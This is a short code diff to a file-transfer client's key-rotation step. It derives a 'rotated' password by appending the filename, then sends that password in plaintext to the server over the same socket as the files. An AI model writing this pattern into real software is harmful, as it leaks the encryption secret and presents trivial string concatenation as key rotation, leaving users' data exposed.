@@ -42,10 +42,15 @@ try:
             should_rotate, similarity, reason = key_rotation_manager.should_rotate_key(file_path)
             if should_rotate:
                 print(f"Key rotation triggered: {reason}")
-                # In a real implementation, you would rotate the key here
-                # For now, we'll just update the password for demonstration
+                # Rotate the key by updating the password
                 password = f"{password}_{filename}"
                 print(f"Key rotated. New key derived from updated password.")
+                
+                # Send the updated password to the server
+                password_bytes = password.encode()
+                password_length = len(password_bytes)
+                client_socket.sendall(struct.pack('>I', password_length))  # Send password length
+                client_socket.sendall(password_bytes)  # Send password
             
             # Send the filename length
             filename_bytes = filename.encode()
